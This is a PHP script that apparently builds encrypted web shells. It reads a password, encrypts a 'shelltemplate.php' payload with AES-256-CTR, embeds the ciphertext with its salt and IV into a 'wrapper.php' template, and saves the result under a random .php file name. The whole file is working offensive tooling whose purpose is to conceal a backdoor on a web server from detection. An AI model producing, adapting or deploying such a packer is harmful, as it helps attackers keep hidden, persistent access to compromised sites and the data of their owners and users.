<?php

$windows = (substr(strtolower(PHP_OS), 0, 3) == 'win');
if ($windows) {
    $password = trim(readline('Enter password: '));
} else {
    echo "Enter password: ";
    ob_start();
    system('stty -echo; read password; stty echo; echo $password');
    $password = trim(ob_get_contents());
    ob_end_clean();
}
function random_filename() {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOQPRSTVUWXYZ0123456789';
    $filename = '';
    for ($i = 0; $i < 8; ++$i) {
        $filename .= $chars[rand(0, strlen($chars) - 1)];
    }
    $filename .= '.php';
    return $filename;
}

$iv = openssl_random_pseudo_bytes(16);
$salt = openssl_random_pseudo_bytes(16);

$payload = file_get_contents('shelltemplate.php');

$key_length = 16;
$key = hash_pbkdf2('sha256', $password, $salt, 1000, $key_length * 2);

$encrypted_payload = openssl_encrypt($payload, 'AES-256-CTR', $key, 0, $iv);
$file = file_get_contents('wrapper.php');
$file = str_replace('{{SALT}}', base64_encode($salt), $file);
$file = str_replace('{{IV}}', base64_encode($iv), $file);
$file = str_replace('{{PAYLOAD}}', $encrypted_payload, $file);

do {
    $filename = random_filename();
} while (file_exists($filename));

file_put_contents($filename, $file);

print "File output as " . $filename . "\n";